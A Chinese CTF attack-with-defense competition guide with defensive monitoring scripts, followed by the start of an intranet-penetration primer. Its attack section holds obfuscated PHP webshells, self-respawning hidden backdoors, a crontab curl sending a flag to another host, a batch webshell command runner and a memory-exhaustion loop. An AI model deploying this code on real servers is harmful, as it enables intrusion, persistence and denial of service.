title="只有user权限"></a>只有user权限</h5><p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p><p>这钟情况又可以用不同的方式包含。</p><p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p><p>如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。</p><pre><code>include(&#39;phpwaf.php&#39;);</code></pre><p>还有一种是替换index.php，也就是讲index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p><p>当然还没完，还要在原phpwaf.php中包含原来的index.php。</p><pre><code>index.php -&gt; index2.phpphpwaf.php -&gt; index.phpinclude(&#39;index2.php&#39;);</code></pre><p>至于你想用哪种方式，看你心情咯，你开心就好。</p><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>文件监控，会将新文件或者当文件被修改时立即恢复</p><pre><code class="python"># -*- coding: utf-8 -*-# @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--# v demo 0.21 修改了备份的webshell会自己坑自己的情况# todo: windows下不支持中文目录#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = {}      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;Special_string = &#39;drops_log&#39;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = {    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),}def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#39;rb&#39;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = {}    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#39;bak&#39;])if __name__ == &#39;__main__&#39;:    print u&#39;---------start------------&#39;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#39;[*] pre work end!&#39;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#39;[*] &#39; + getUnicode(time.ctime())</code></pre><p>上个文档监控的脚本，这个确实给我们帮了大忙，它会检测目录下过去一段时间内是否有文档改动然后备份该文档并将其删除，这里主要用到的命令就是</p><p>find -name ‘*.php’ -mmin -10</p><p>这样就会找出过去10分钟发生改动的文档，我也先试着运行了一下命令，然后就是一大片木马展示在你眼前，当时的心情真是难以言喻，赶紧备份删马，上监控脚本，</p><h3 id="查找常见备份文档"><a href="#查找常见备份文档" class="headerlink" title="查找常见备份文档"></a>查找常见备份文档</h3><pre><code># 例如bak文档find / -name &quot;*.bak&quot;</code></pre><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>可以在机器上利用tcpdump进行流量抓取</p><pre><code class="bash">sudo tcpdump -s 0 port xxxx -w flow.pcap</code></pre><p>追踪下tcp流，溯源</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>tail -f *.log，看日志，不言而喻，抓他们的payload并利用；</p><p>php脚本</p><pre><code class="php">&lt;?phpdate_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;];   //访问者要访问的文件名$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time     =   date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\r\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt;</code></pre><p>一些日志分析工具</p><ol><li>LogForensics 腾讯实验室 <a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">https://security.tencent.com/index.php/opensource/detail/15</a></li><li>北风飘然@金乌网络安全实验室 <a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">http://www.freebuf.com/sectool/126698.html</a></li><li>网络ID为piaox的安全从业人员： <a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">http://www.freebuf.com/sectool/110644.html</a></li><li>网络ID：SecSky <a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">http://www.freebuf.com/sectool/8982.html</a></li><li>网络ID：鬼魅羊羔<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/96675.html</a></li></ol><pre><code># 日志地址/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/</code></pre><h2 id="0x01-攻击"><a href="#0x01-攻击" class="headerlink" title="0x01 攻击"></a>0x01 攻击</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>主机发现可以用httpscan这个工具  ./httpscan.py 10.20.30.0/24 –t 10</p><p>端口扫描用nmap</p><pre><code># 使用httpscan脚本./httpscan.py 172.16.0.0/24 –t 10# masscanmasscan -p 80 172.16.0.0/24# nmapnmap –sn 172.16.0.0/24</code></pre><h3 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h3><p>比赛刚开始拼手速，前面提到了一开始需要先讲本机ssh密码和mysql密码改了，同时队友可以试试其他机器的，万一所有机器的口令密码一样就美滋滋了</p><p>除了系统层面的口令外，还要考虑下web后台口令</p><h3 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h3><p>在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这个是送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）</p><p>将服务器中web目录下载到本地，利用D盾扫描，一般就可以发现预留后门：</p><pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h3 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h3><ul><li>Getshell：<ul><li>官方后门、文件上传</li><li>文件写入、文件包含</li><li>命令注入、反序列化</li><li>Redis写shell</li><li>Mysql写shell</li></ul></li><li>直接读文件：<ul><li>SSRF</li><li>任意文件读取</li><li>XXE</li><li>文件上传</li><li>rce</li><li>文件包含</li><li>Sqli</li></ul></li></ul><p>sql注入一般没有防护（对方部署的waf除外），可以用sqlmap跑，再利用<code>—sql-shell</code>执行<code>select load_file(‘/flag’);</code>即可得到flag，也可以利用<code>into outfile</code>写木马维持权限，但要根据实际情况，可能会遇到权限问题。用sqlmap跑比较耗时，可以利用payload写一个python，自动化进行攻击：</p><p>上传漏洞也可能只是简单的黑名单或者解析漏洞</p><p>文件包含一般可以跨目录读取flag</p><pre><code>def include(host): r=requests. get(url=&quot;http://%s/?t=../../../../../../flag&quot;% host)flags=re. findall(r&#39;^(.+?)&lt;&#39;,r. content)if flags: return flags[e]else:return &quot;error pwn!&quot;</code></pre><p>命令执行</p><p>拿到命令执行漏洞后执行crontab</p><pre><code># 参考# http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;</code></pre><h4 id="非常规一句话"><a href="#非常规一句话" class="headerlink" title="非常规一句话"></a>非常规一句话</h4><p>一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数</p><pre><code class="php">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;连接方式：?2=assert密码：1</code></pre><pre><code class="php">&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e=&#39;($_REQUEST[C])&#39;;@assert($a.$b.$c.$d.$e);?&gt;连接方式：?b=))99(rhC(tseuqeR+lave</code></pre><pre><code class="php">&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&#39;n985de9&#39;];if(isset($s22)){eval($s21($s22));}?&gt;连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0</code></pre><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>不死马，访问后会一直生成.config.php的一句话。解决方案：重启apache或者写个脚本一直kill这个进程</p><pre><code class="php">&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    while(1){        file_put_contents(&#39;./.config.php&#39;,&#39;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&#39;);        system(&#39;chmod 777 .config.php&#39;);        touch(&quot;./.config.php&quot;,mktime(20,15,1,11,28,2016));        usleep(100);        }?&gt;</code></pre><p>这个不死马运行后会删除自己，一直生成一个.config.php，和上面的类似</p><p>tips: <code>.config.php</code> 前面使用一个点，能很好的隐藏文档。</p><pre><code class="php">&lt;?php    set_time_limit(0);     ignore_user_abort(1);     unlink(__FILE__);     while(1){         file_put_contents(&#39;.config.php&#39;,&#39;&lt;?php @eval($_POST[&quot;password&quot;]);?&gt;&#39;);         sleep(5);    }</code></pre><p>素质低的人则会放置一个md5马，比如</p><pre><code>&lt;?phpif(md5($_POST[&#39;pass&#39;])==&#39;e5e47c6c69adcf1e7681a0bb384dfe44&#39;)@eval($_POST[&#39;cmd&#39;]);?&gt;密码Bigbrokesec</code></pre><p>如果素质低的人又很猥琐，像 <a href="https://www.saowen.com/rd/aHR0cDovL2Jsb2cuMTYzLmNvbS9wYXNzdzBhX2QvYmxvZy9zdGF0aWMvMjUwODA3MDYxMjAxNzYxMzExMzg1OTY5MS8=" target="_blank" rel="external">rootrain</a> 这种就是。那就是利用 <code>header</code> ，最后综合起来就是</p><pre><code>&lt;?phpecho &#39;hello&#39;;if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;) if (@$_SERVER[&#39;HTTP_USER_AGENT&#39;] == &#39;flag&#39;){ $test= &#39;flag&#39;;    header(&quot;flag:$test&quot;);}?&gt;</code></pre><p>放进 <code>config.php</code> 效果最好，因为一般很少人去看这个。</p><h4 id="不死马的解决方案"><a href="#不死马的解决方案" class="headerlink" title="不死马的解决方案"></a>不死马的解决方案</h4><p>先查看进程对应的pid，</p><p><code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。再执行以下</p><pre><code class="php">&lt;?phpwhile (1) {    $pid=1234;    @unlink(&#39;config.php&#39;);    exec(&#39;kill -9 $pid&#39;);}?&gt;</code></pre><p>（2）重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文档夹。</p><h4 id="获取flag的方式"><a href="#获取flag的方式" class="headerlink" title="获取flag的方式"></a>获取flag的方式</h4><p>线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。</p><p>最好能写一个批量上传的，结合批量访问。批量访问参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="external">PHP-定时任务</a><br>或者</p><pre><code>#!/bin/bashwhile truedo    flag=$(curl &#39;http://172.16.4.42:800&#39;)    curl --cookie &quot;PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD&quot; --data &quot;key=&quot;${flag} &quot;http://172.16.4.42/index.php/wargame/submit&quot;    sleep 1sdone</code></pre><h3 id="一句话批量（py2-3-通用）"><a href="#一句话批量（py2-3-通用）" class="headerlink" title="一句话批量（py2 3 通用）"></a>一句话批量（py2 3 通用）</h3><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><pre><code># -*- coding:utf-8 -*-import requests# ------------------------------------- CONFIG -----------------------------------# 目标网段ips_suffix = &#39;192.168.1.&#39;ip_first = 103ip_end = 105# 目标协议 http or httpsschema = &#39;http&#39;# shell相对路径path = &#39;/temp/shell.php&#39;# headersheaders = {&#39;USER-AGENT&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#39;}# cookies       直接burp抓到的cookie即可cookie = &#39;PHPSESSID=eooaqev53m4sqft7csm55eh1l5&#39; # burp抓到的cookie替换此处# shell密码shell_pass = &#39;CCcKNiFeee&#39;# 执行的系统命令exec_command = &#39;whoami&#39;# -------------------------------------- parama -------------------------------------cookies = {}cookie = cookie.split(&#39;;&#39;)for one_cookie in cookie:    key,value = one_cookie.split(&#39;=&#39;,1)    cookies[key.strip(&#39; &#39;)] = valuedata = {shell_pass:&#39;system(&quot;{exec_command}&quot;);&#39;.format(exec_command=exec_command)}# -------------------------------------- attrack ------------------------------------for ip in range(ip_first,ip_end+1):    shell_url = schema + &#39;://&#39; + ips_suffix + str(ip) + path    try:        result = requests.post(shell_url,headers=headers,cookies=cookies,data=data,timeout=3).text        print (result)    except:        print (shell_url + &#39;\tTIMEOUT!!!&#39;)</code></pre><h2 id="0x03-一些小tips"><a href="#0x03-一些小tips" class="headerlink" title="0x03 一些小tips"></a>0x03 一些小tips</h2><p>当怀疑某个进程是受到攻击后创建的shell进程，可以分析这个进程是否有socket连接</p><pre><code>netstat -antulp        #查看连接internet的进程ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l        #查看指定进程socket连接数的命令</code></pre><p>类似的可以查看是否有管道连接</p><pre><code>ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l</code></pre><p>如果有连接，kill掉进程</p><p>最后</p><h2 id="0x04-搅屎"><a href="#0x04-搅屎" class="headerlink" title="0x04 搅屎"></a>0x04 搅屎</h2><p>常驻内存之后，进入死循环。</p><p>循环内部是实现无效複製自身并且访问web服务的功能。</p><p>执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。</p><pre><code>&lt;?php    set_time_limit(0);    ignore_user_abort(true);    while(1){        file_put_contents(randstr().&#39;.php&#39;,file_get_content(__FILE__));        file_get_contents(&quot;http://127.0.0.1/&quot;);    }?&gt;</code></pre><h2 id="0x05-Github-项目推荐"><a href="#0x05-Github-项目推荐" class="headerlink" title="0x05 Github 项目推荐"></a>0x05 Github 项目推荐</h2><p><a href="https://github.com/ssooking/CTFDefense" target="_blank" rel="external">CTFDefense</a><br><a href="https://github.com/wupco/weblogger" target="_blank" rel="external">流量分析</a></p><h2 id="0x06-自己搭建AWD环境"><a href="#0x06-自己搭建AWD环境" class="headerlink" title="0x06 自己搭建AWD环境"></a>0x06 自己搭建AWD环境</h2><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="external">https://github.com/zhl2008/awd-platform</a></p><h2 id="0x07-文章推荐："><a href="#0x07-文章推荐：" class="headerlink" title="0x07 文章推荐："></a>0x07 文章推荐：</h2><p>王一航：<a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="external">https://xz.aliyun.com/t/1530/</a></p><p><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd" target="_blank" rel="external">https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603" target="_blank" rel="external">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/" target="_blank" rel="external">https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网渗透基础知识</title>
      <link href="/archis/7db24e65/"/>
      <url>/archis/7db24e65/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透基础知识"><a href="#内网渗透基础知识" class="headerlink" title="内网渗透基础知识"></a>内网渗透基础知识</h1><p>[TOC]</p><h2 id="0x00-内网概述"><a href="#0x00-内网概述" class="headerlink" title="0x00 内网概述"></a>0x00 内网概述</h2><p>内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。<br>内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、网吧、单位办公网等都属于此类。</p><h2 id="0x01-内网名词"><a href="#0x01-内网名词" class="headerlink" title="0x01 内网名词"></a>0x01 内网名词</h2><p>我们在研究内网的时候，经常会听说一些列如“工作组”、“域”、<br>“域控制器（DC）”、“父域”、“了域”、“域树”、“域森林’和“活动目录（AD）”“DMZ”、“域内权限”等专有名词。那么它们到底指的是什么？又有何区别呢？</p><h2 id="0x02-工作组"><a href="#0x02-工作组" class="headerlink" title="0x02 工作组"></a>0x02 工作组</h2><p>工作组（Work Group），在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981146.7729611.jpg" alt=""></p><h4 id="加入-创建工作组"><a href="#加入-创建工作组" class="headerlink" title="加入/创建工作组"></a>加入/创建工作组</h4><p>右击桌面上的“计算机”，在弹出的菜单出选择“属性”，点击“更改设置”，“更改”，在“计算机名”一栏中键入你想好的名称，在“工作组”一栏中键入你想加入的工作组名称。<br>如果你输入的工作组名称网络中没有，那么相当于新建了一个工作组，当然暂时只有你的电脑在组内。单击“确定”按钮后，Windows提示需要重新启动，重新启动之后，再进入“网络”就可以看到你所加入的工作组成员了。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981817.9860647.jpg" alt=""></p><p>可以更改进入行政部</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981914.547977.jpg" alt=""></p><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><ul><li>只要将工作组名称改动即可。不过在网上别人照样可以访问你的共享资源。你也可以随便加入同一网络上的任何其它工作组。“工作组”就像一个可以自由进入和退出的“社团”，方便同一组的计算机互相访问。</li><li>所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的。</li></ul><h2 id="0x02-域"><a href="#0x02-域" class="headerlink" title="0x02 域"></a>0x02 域</h2><ul><li>域（Domain）是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</li><li>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</li></ul><p>内网渗透的目的就是为了获得域控制器</p><p>安全域划分</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542982192.3827906.jpg" alt=""></p><h3 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h3><p>单域<br>父域，子域<br>域树（tree）<br>域森林（forest）<br>DNS域名服务器</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h4 id="父域与子域"><a href="#父域与子域" class="headerlink" title="父域与子域"></a>父域与子域</h4><ul><li>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</li><li>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</li><li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li><li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li><li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</li></ul><h4 id="域树（tree）"><a href="#域树（tree）" class="headerlink" title="域树（tree）"></a>域树（tree）</h4><ul><li>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</li><li>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</li><li>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</li></ul><p>abc.com 是一级域</p><p>asia是二级域</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202615.png" alt=""></p><h4 id="域森林（forest）"><a href="#域森林（forest）" class="headerlink" title="域森林（forest）"></a>域森林（forest）</h4><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202717.png" alt=""></p><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li>DNS域名服务器是进行域名（domain name）和与之相对应的IP地址（IP address）转换的服务器。</li><li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</li><li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li></ul><h2 id="0x03-活动目录（AD）"><a href="#0x03-活动目录（AD）" class="headerlink" title="0x03 活动目录（AD）"></a>0x03 活动目录（AD）</h2><ul><li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li><li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li><li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li></ul><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" 